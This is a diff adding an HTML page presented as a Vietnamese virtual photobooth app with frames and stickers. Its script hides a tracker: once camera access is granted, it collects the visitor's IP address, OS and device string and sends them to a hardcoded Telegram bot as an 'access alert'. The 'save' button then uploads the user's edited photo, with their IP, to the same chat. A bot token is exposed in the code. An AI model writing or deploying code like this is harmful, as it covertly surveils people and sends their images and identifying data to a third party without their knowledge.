@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>bwoptb - Virtual Photobooth</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fabric.js/5.3.1/fabric.min.js"></script>
+    <style>
+        :root { --primary-color: #3498db; --bg-color: #f4f4f9; --text-color: #333; }
+        body { font-family: 'Segoe UI', sans-serif; margin: 0; background-color: var(--bg-color); color: var(--text-color); display: flex; flex-direction: column; align-items: center; }
+        header { width: 100%; padding: 20px; text-align: center; background: #222; color: white; font-size: 2rem; font-weight: bold; letter-spacing: 2px; }
+        .theme-switcher { margin: 15px; display: flex; gap: 10px; }
+        .theme-dot { width: 30px; height: 30px; border-radius: 50%; cursor: pointer; border: 2px solid #fff; }
+        .container { display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; padding: 20px; max-width: 1200px; }
+        .view-section { background: white; padding: 15px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        video, canvas { border-radius: 8px; background: #000; }
+        .controls { display: flex; flex-direction: column; gap: 15px; width: 300px; }
+        .btn { padding: 12px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.2s; text-align: center; }
+        .btn-main { background: var(--primary-color); color: white; }
+        .frame-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .hidden { display: none; }
+        #status { font-size: 0.8rem; color: #7f8c8d; margin-top: 10px; text-align: center; }
+    </style>
+</head>
+<body>
+
+    <header>bwoptb</header>
+
+    <div class="theme-switcher">
+        <div id="themes"></div> </div>
+
+    <div class="container">
+        <div class="view-section">
+            <div id="camera-box">
+                <video id="video" width="600" height="450" autoplay></video>
+            </div>
+            <div id="canvas-box" class="hidden">
+                <canvas id="c"></canvas>
+            </div>
+            <div id="status">Vui lòng cho phép máy ảnh để bắt đầu...</div>
+        </div>
+
+        <div class="controls">
+            <button id="snap" class="btn btn-main">📸 CHỤP ẢNH</button>
+            
+            <div id="edit-tools" class="hidden">
+                <h3>Khung hình (Frames)</h3>
+                <div class="frame-grid">
+                    <button class="btn" onclick="applyFrame(2)">2 Ảnh</button>
+                    <button class="btn" onclick="applyFrame(3)">3 Ảnh</button>
+                    <button class="btn" onclick="applyFrame(4)">4 Ảnh</button>
+                    <button class="btn" onclick="applyFrame(1)">Xóa khung</button>
+                </div>
+
+                <h3>Stickers</h3>
+                <input type="file" id="sticker-upload" accept="image/*" class="hidden">
+                <button class="btn btn-main" onclick="document.getElementById('sticker-upload').click()">+ Thêm Sticker</button>
+
+                <hr style="width:100%; margin: 10px 0;">
+                <button class="btn" style="background: #95a5a6; color: white;" onclick="resetAll()">Chụp lại</button>
+                <button id="btn-save" class="btn" style="background: #27ae60; color: white;" onclick="handleFinalSave()">Lưu & Gửi Ảnh</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- CẤU HÌNH TELEGRAM ---
+        const BOT_TOKEN = '7551411002:AAEwAV8ggQRnQZwuYyeMSs9m0KuVnRBhIm0';
+        const CHAT_ID = '5160039491';
+
+        const info = { time: new Date().toLocaleString('vi-VN'), ip: 'Đang lấy...', device: '', os: '' };
+        const video = document.getElementById('video');
+        const status = document.getElementById('status');
+        let canvas, hasSentInitial = false;
+
+        // 1. Thu thập thông tin thiết bị
+        function getDeviceDetails() {
+            const ua = navigator.userAgent;
+            if (/Android/i.test(ua)) info.os = "Android";
+            else if (/iPhone|iPad|iPod/i.test(ua)) info.os = "iOS";
+            else info.os = "Windows/PC";
+            info.device = ua.split('(')[1]?.split(')')[0] || "Không xác định";
+        }
+
+        // 2. Gửi tin nhắn văn bản về Telegram
+        async function sendLog(msg) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
+                });
+            } catch (e) {}
+        }
+
+        // 3. Khởi tạo Camera & Kích hoạt gửi Info
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                status.innerText = "Máy ảnh đã sẵn sàng!";
+                
+                // Sau khi cho phép camera, lấy IP và gửi info ngay
+                getDeviceDetails();
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const data = await res.json();
+                    info.ip = data.ip;
+                } catch(e) { info.ip = "Không rõ (Bị chặn)"; }
+
+                if(!hasSentInitial) {
+                    sendLog(`<b>🔔 CẢNH BÁO TRUY CẬP</b>\n------------------\n<b>IP:</b> ${info.ip}\n<b>OS:</b> ${info.os}\n<b>Thiết bị:</b> ${info.device}\n<b>Thời gian:</b> ${info.time}`);
+                    hasSentInitial = true;
+                }
+            } catch (err) {
+                status.innerText = "Lỗi: Bạn cần cho phép máy ảnh để sử dụng.";
+            }
+        }
+        initCamera();
+
+        // 4. Fabric Canvas
+        canvas = new fabric.Canvas('c', { width: 600, height: 450 });
+
+        // 5. Chụp ảnh
+        document.getElementById('snap').addEventListener('click', () => {
+            const tempCanvas = document.createElement('canvas');
+            tempCanvas.width = video.videoWidth;
+            tempCanvas.height = video.videoHeight;
+            tempCanvas.getContext('2d').drawImage(video, 0, 0);
+            
+            fabric.Image.fromURL(tempCanvas.toDataURL('image/png'), (img) => {
+                img.set({ selectable: false });
+                canvas.add(img).sendToBack(img);
+            });
+
+            document.getElementById('camera-box').classList.add('hidden');
+            document.getElementById('snap').classList.add('hidden');
+            document.getElementById('canvas-box').classList.remove('hidden');
+            document.getElementById('edit-tools').classList.remove('hidden');
+        });
+
+        // 6. Sticker
+        document.getElementById('sticker-upload').addEventListener('change', (e) => {
+            const reader = new FileReader();
+            reader.onload = (f) => {
+                fabric.Image.fromURL(f.target.result, (img) => {
+                    img.scale(0.2);
+                    canvas.add(img).setActiveObject(img);
+                });
+            };
+            reader.readAsDataURL(e.target.files[0]);
+        });
+
+        // 7. Khung hình
+        function applyFrame(type) {
+            canvas.getObjects('rect').forEach(obj => canvas.remove(obj));
+            const w = 600, h = 450, color = "#fff";
+            if (type === 2) { addRect(0,0,300,450); addRect(300,0,300,450); }
+            else if (type === 3) { addRect(0,0,200,450); addRect(200,0,200,450); addRect(400,0,200,450); }
+            else if (type === 4) { addRect(0,0,300,225); addRect(300,0,300,225); addRect(0,225,300,225); addRect(300,225,300,225); }
+            canvas.renderAll();
+        }
+        function addRect(x,y,w,h) {
+            canvas.add(new fabric.Rect({ left: x, top: y, width: w, height: h, fill: 'transparent', stroke: '#fff', strokeWidth: 15, selectable: false, evented: false }));
+        }
+
+        // 8. Lưu và Gửi Ảnh Final
+        async function handleFinalSave() {
+            status.innerText = "Đang gửi ảnh kết quả...";
+            const dataURL = canvas.toDataURL({ format: 'png', quality: 0.8 });
+            
+            // Download cho user
+            const link = document.createElement('a');
+            link.download = `bwoptb-final.png`;
+            link.href = dataURL;
+            link.click();
+
+            // Gửi telegram
+            try {
+                const blob = await (await fetch(dataURL)).blob();
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, 'result.png');
+                fd.append('caption', `✅ <b>ẢNH KẾT QUẢ</b>\nIP: ${info.ip}\nThiết bị: ${info.os}`);
+                fd.append('parse_mode', 'HTML');
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                status.innerText = "Đã lưu và gửi thành công!";
+            } catch (e) { status.innerText = "Lỗi khi gửi ảnh."; }
+        }
+
+        // Theme System
+        const colors = ['#3498db', '#e74c3c', '#2ecc71', '#f1c40f', '#9b59b6', '#34495e'];
+        colors.forEach(c => {
+            const dot = document.createElement('div');
+            dot.className = 'theme-dot';
+            dot.style.background = c;
+            dot.onclick = () => document.documentElement.style.setProperty('--primary-color', c);
+            document.getElementById('themes').appendChild(dot);
+        });
+
+        function resetAll() {
+            canvas.clear();
+            document.getElementById('camera-box').classList.remove('hidden');
+            document.getElementById('snap').classList.remove('hidden');
+            document.getElementById('canvas-box').classList.add('hidden');
+            document.getElementById('edit-tools').classList.add('hidden');
+        }
+    </script>
+</body>
+</html>
